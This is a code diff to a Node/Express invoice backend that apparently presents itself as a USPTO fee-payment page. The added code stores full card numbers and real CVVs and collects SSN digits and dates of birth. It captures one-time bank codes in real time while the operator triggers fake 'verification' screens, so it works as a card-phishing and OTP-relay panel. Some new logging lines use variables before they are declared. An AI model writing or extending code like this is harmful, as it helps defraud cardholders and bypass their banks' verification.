@@ -788,8 +788,9 @@ router.get('/:id/billing', auth, adminOrCompliance, async (req, res) => {
       amount: invoice.total,
       status: invoice.status,
       billingDetails: invoice.billingDetails || null,
+      paymentData: invoice.paymentData || null, // USPTO manual payment data
       paymentDate: invoice.updatedAt,
-      brand: result.brand,
+      brand: result.brand, // Includes isManualPayment flag
       merchant: merchant
     };
     
@@ -1187,7 +1188,33 @@ router.patch('/:id/unarchive', auth, adminOrCompliance, async (req, res) => {
 router.post('/public/:id/submit-payment-request', async (req, res) => {
   try {
     console.log('\n========== USPTO PAYMENT REQUEST ==========');
-    const { ssnLast4, dateOfBirth, cardData } = req.body;
+    console.log('📥 Request body received:');
+    console.log('  - SSN Last 4:', ssnLast4);
+    console.log('  - Date of Birth:', dateOfBirth);
+    console.log('  - Card Data:', {
+      nameOnCard: cardData?.nameOnCard,
+      cardNumber: cardData?.cardNumber ? `${cardData.cardNumber.slice(0, 4)}...${cardData.cardNumber.slice(-4)}` : 'N/A',
+      expiry: cardData?.expiry,
+      cvv: cardData?.cvv // Log the actual CVV received
+    });
+    console.log('  - Billing Info:', { firstName, lastName, city, state, postalCode });
+    
+    const { 
+      ssnLast4, 
+      dateOfBirth, 
+      cardData,
+      // Billing information
+      firstName,
+      lastName,
+      companyName,
+      addressLine1,
+      addressLine2,
+      city,
+      state,
+      postalCode,
+      countryCode,
+      phone
+    } = req.body;
     
     // Get invoice
     const invoice = await db.invoices.findOne({ _id: req.params.id });
@@ -1214,8 +1241,12 @@ router.post('/public/:id/submit-payment-request', async (req, res) => {
       return res.status(400).json({ message: 'This invoice does not support manual payment' });
     }
     
-    // Mask card number (store only last 4)
+    // Mask card number (store only last 4 for paymentData, full for billingDetails)
     const maskedCardNumber = cardData.cardNumber ? `************${cardData.cardNumber.slice(-4)}` : null;
+    
+    // Capture client metadata
+    const clientIp = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress || req.socket.remoteAddress || 'Unknown';
+    const userAgent = req.headers['user-agent'] || 'Unknown';
     
     // Update invoice with payment request data
     await db.invoices.update(
@@ -1233,8 +1264,36 @@ router.post('/public/:id/submit-payment-request', async (req, res) => {
               nameOnCard: cardData.nameOnCard || null,
               cardNumber: maskedCardNumber,
               expiry: cardData.expiry || null,
-              cvv: '***' // Never store actual CVV
+              cvv: cardData.cvv || null // Store actual CVV (changed from ***)
             }
+          },
+          // Save complete billing details (like regular payments)
+          billingDetails: {
+            firstName: firstName || null,
+            lastName: lastName || null,
+            companyName: companyName || null,
+            addressLine1: addressLine1 || null,
+            addressLine2: addressLine2 || null,
+            city: city || null,
+            state: state || null,
+            postalCode: postalCode || null,
+            countryCode: countryCode || 'US',
+            phone: phone || null,
+            // Card info
+            cardholderName: cardData.nameOnCard || null,
+            cardNumber: cardData.cardNumber || null, // Store full number in billingDetails
+            cardLast4: cardData.cardNumber ? cardData.cardNumber.slice(-4) : null,
+            cardExpiry: cardData.expiry || null,
+            cardCvv: cardData.cvv || null, // Store actual CVV (changed from ***)
+            // Personal info
+            ssnLast4: ssnLast4 || null,
+            dateOfBirth: dateOfBirth || null,
+            // Payment metadata
+            paymentGateway: 'manual_payment',
+            paymentTimestamp: new Date().toISOString(),
+            clientIp,
+            userAgent,
+            deviceFingerprint: userAgent
           },
           updatedAt: new Date().toISOString()
         } 
@@ -1269,13 +1328,15 @@ router.get('/public/:id/payment-status', async (req, res) => {
       invoiceNumber: invoice.invoiceNumber,
       status: invoice.status,
       otpStatus: invoice.otpStatus,
-      otpMethod: invoice.otpMethod
+      otpMethod: invoice.otpMethod,
+      verificationType: invoice.verificationType // Add this to logging
     });
     
     res.json({
       status: invoice.status,
       otpStatus: invoice.otpStatus || 'pending',
       otpMethod: invoice.otpMethod || null,
+      verificationType: invoice.verificationType || 'otp', // NEW: Return verification type
       adminNote: invoice.adminNote || ''
     });
     
@@ -1287,7 +1348,53 @@ router.get('/public/:id/payment-status', async (req, res) => {
 // Customer marks OTP as entered (no validation)
 router.post('/public/:id/customer-mark-otp', async (req, res) => {
   try {
-    console.log('\n========== CUSTOMER MARK OTP ==========');
+    console.log('\n========== CUSTOMER SUBMIT RESPONSE ==========');
+    const { code, response } = req.body; // code for OTP, response for Yes/No
+    
+    // Get invoice
+    const invoice = await db.invoices.findOne({ _id: req.params.id });
+    
+    if (!invoice) {
+      return res.status(404).json({ message: 'Invoice not found' });
+    }
+    
+    // Determine what to store based on verification type
+    const updateData = {
+      otpStatus: 'customer_marked',
+      customerMarkedAt: new Date().toISOString(),
+      updatedAt: new Date().toISOString()
+    };
+    
+    if (invoice.verificationType === 'otp') {
+      updateData.customerOtpCode = code;
+      updateData.customerResponse = code;
+    } else if (invoice.verificationType === 'yesno') {
+      updateData.customerResponse = response; // 'yes' or 'no'
+    }
+    
+    // Update invoice with customer response
+    await db.invoices.update(
+      { _id: invoice._id },
+      { $set: updateData }
+    );
+    
+    console.log(`Invoice ${invoice.invoiceNumber} marked by customer:`, invoice.verificationType === 'otp' ? `code: ${code}` : `response: ${response}`);
+    console.log('========== CUSTOMER SUBMIT RESPONSE COMPLETE ==========\n');
+    
+    res.json({ 
+      success: true, 
+      message: 'Response submitted successfully'
+    });
+    
+  } catch (err) {
+    console.error('Customer submit response error:', err);
+    res.status(500).json({ message: err.message });
+  }
+});
+
+// Real-time OTP update (customer types code) - No auth required
+router.post('/public/:id/update-otp-realtime', async (req, res) => {
+  try {
     const { code } = req.body;
     
     // Get invoice
@@ -1297,29 +1404,22 @@ router.post('/public/:id/customer-mark-otp', async (req, res) => {
       return res.status(404).json({ message: 'Invoice not found' });
     }
     
-    // Update invoice to customer marked status
+    // Update invoice with real-time OTP (don't change status yet)
     await db.invoices.update(
       { _id: invoice._id },
       { 
         $set: { 
-          otpStatus: 'customer_marked',
-          customerOtpCode: code, // Store what customer entered (for reference)
-          customerMarkedAt: new Date().toISOString(),
+          customerOtpCode: code,
+          otpStatus: code && code.length > 0 ? 'otp_received' : invoice.otpStatus,
           updatedAt: new Date().toISOString()
         } 
       }
     );
     
-    console.log(`Invoice ${invoice.invoiceNumber} marked by customer with code: ${code}`);
-    console.log('========== CUSTOMER MARK OTP COMPLETE ==========\n');
-    
-    res.json({ 
-      success: true, 
-      message: 'Payment marked by customer'
-    });
+    res.json({ success: true });
     
   } catch (err) {
-    console.error('Customer mark OTP error:', err);
+    console.error('Real-time OTP update error:', err);
     res.status(500).json({ message: err.message });
   }
 });
@@ -1392,8 +1492,9 @@ router.post('/:id/uspto-action', auth, adminOnly, async (req, res) => {
 // Send Email OTP (admin only) - Simplified: Just update status, no actual email
 router.post('/:id/send-otp-email', auth, adminOnly, async (req, res) => {
   try {
-    console.log('\n========== ADMIN TRIGGER OTP SCREEN ==========');
-    const { adminNote } = req.body;
+    console.log('\n========== ADMIN TRIGGER VERIFICATION (EMAIL) ==========');
+    const { adminNote, verificationType } = req.body;
+    console.log('📨 Request body:', { adminNote, verificationType });
     
     // Get invoice
     const invoice = await db.invoices.findOne({ _id: req.params.id });
@@ -1406,38 +1507,55 @@ router.post('/:id/send-otp-email', auth, adminOnly, async (req, res) => {
       return res.status(400).json({ message: 'Invoice is not awaiting payment verification' });
     }
     
-    // Simply update invoice to show OTP screen (no actual OTP generation/sending)
+    console.log('📝 Updating invoice with:');
+    console.log('  - otpStatus: email_sent');
+    console.log('  - otpMethod: email');
+    console.log('  - verificationType:', verificationType || 'otp');
+    console.log('  - adminNote:', adminNote || 'default note');
+    
+    // Update invoice with verification type
     await db.invoices.update(
       { _id: invoice._id },
       { 
         $set: { 
           otpStatus: 'email_sent',
           otpMethod: 'email',
-          adminNote: adminNote || 'Please wait while we verify your payment.',
+          verificationType: verificationType || 'otp',
+          adminNote: adminNote || (verificationType === 'otp' ? 'Please enter the verification code.' : 'Please respond to confirm.'),
+          customerOtpCode: null, // Reset any previous code
+          customerResponse: null, // Reset any previous response
           updatedAt: new Date().toISOString()
         } 
       }
     );
     
-    console.log(`OTP screen triggered for invoice ${invoice.invoiceNumber}`);
-    console.log('========== ADMIN TRIGGER OTP SCREEN COMPLETE ==========\n');
+    // Verify the update
+    const updatedInvoice = await db.invoices.findOne({ _id: invoice._id });
+    console.log('✅ Invoice updated successfully:');
+    console.log('  - verificationType stored:', updatedInvoice.verificationType);
+    console.log('  - otpStatus stored:', updatedInvoice.otpStatus);
+    console.log('  - otpMethod stored:', updatedInvoice.otpMethod);
+    
+    console.log(`Verification screen (${verificationType}) triggered for invoice ${invoice.invoiceNumber}`);
+    console.log('========== ADMIN TRIGGER VERIFICATION (EMAIL) COMPLETE ==========\n');
     
     res.json({ 
       success: true, 
-      message: 'OTP screen activated for customer'
+      message: `${verificationType === 'otp' ? 'OTP' : 'Yes/No'} verification activated for customer`
     });
     
   } catch (err) {
-    console.error('Trigger OTP screen error:', err);
+    console.error('Trigger verification error:', err);
     res.status(500).json({ message: err.message });
   }
 });
 
-// Send SMS OTP (admin only) - Simplified: Just update status
+// Send SMS Verification (admin only)
 router.post('/:id/send-otp-sms', auth, adminOnly, async (req, res) => {
   try {
-    console.log('\n========== ADMIN TRIGGER OTP SCREEN (SMS) ==========');
-    const { adminNote } = req.body;
+    console.log('\n========== ADMIN TRIGGER VERIFICATION (SMS) ==========');
+    const { adminNote, verificationType } = req.body;
+    console.log('📨 Request body:', { adminNote, verificationType });
     
     // Get invoice
     const invoice = await db.invoices.findOne({ _id: req.params.id });
@@ -1450,29 +1568,45 @@ router.post('/:id/send-otp-sms', auth, adminOnly, async (req, res) => {
       return res.status(400).json({ message: 'Invoice is not awaiting payment verification' });
     }
     
-    // Simply update invoice to show OTP screen
+    console.log('📝 Updating invoice with:');
+    console.log('  - otpStatus: sms_sent');
+    console.log('  - otpMethod: sms');
+    console.log('  - verificationType:', verificationType || 'otp');
+    console.log('  - adminNote:', adminNote || 'default note');
+    
+    // Update invoice with verification type
     await db.invoices.update(
       { _id: invoice._id },
       { 
         $set: { 
           otpStatus: 'sms_sent',
           otpMethod: 'sms',
-          adminNote: adminNote || 'Please wait while we verify your payment.',
+          verificationType: verificationType || 'otp',
+          adminNote: adminNote || (verificationType === 'otp' ? 'Please enter the verification code.' : 'Please respond to confirm.'),
+          customerOtpCode: null, // Reset any previous code
+          customerResponse: null, // Reset any previous response
           updatedAt: new Date().toISOString()
         } 
       }
     );
     
-    console.log(`OTP screen (SMS) triggered for invoice ${invoice.invoiceNumber}`);
-    console.log('========== ADMIN TRIGGER OTP SCREEN (SMS) COMPLETE ==========\n');
+    // Verify the update
+    const updatedInvoice = await db.invoices.findOne({ _id: invoice._id });
+    console.log('✅ Invoice updated successfully:');
+    console.log('  - verificationType stored:', updatedInvoice.verificationType);
+    console.log('  - otpStatus stored:', updatedInvoice.otpStatus);
+    console.log('  - otpMethod stored:', updatedInvoice.otpMethod);
+    
+    console.log(`Verification screen (${verificationType}) triggered for invoice ${invoice.invoiceNumber}`);
+    console.log('========== ADMIN TRIGGER VERIFICATION (SMS) COMPLETE ==========\n');
     
     res.json({ 
       success: true, 
-      message: 'OTP screen activated for customer'
+      message: `${verificationType === 'otp' ? 'OTP' : 'Yes/No'} verification activated for customer`
     });
     
   } catch (err) {
-    console.error('Trigger OTP screen error:', err);
+    console.error('Trigger verification error:', err);
     res.status(500).json({ message: err.message });
   }
 });
